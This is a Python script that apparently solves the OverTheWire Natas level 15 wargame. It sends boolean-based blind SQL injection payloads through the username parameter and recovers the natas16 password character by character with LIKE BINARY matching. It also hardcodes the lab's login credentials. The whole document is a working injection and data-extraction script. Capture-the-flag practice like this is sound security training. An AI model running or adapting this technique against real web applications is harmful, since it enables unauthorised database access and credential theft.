
import requests
from string import ascii_letters,digits

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

charset = ascii_letters + digits
found = ""

for position in range (1,33):
    for char in charset:
        payload = f'natas16" AND password LIKE BINARY "{found}{char}%'
        r = requests.get(url,auth=auth,params={"username":payload})

        if "This user exists" in r.text:
            found+=char
            print(f"Position {position}: {found}")
            break
    else :
        print("No match found at position", position, "- stopping")
        break

print("Final password is",found)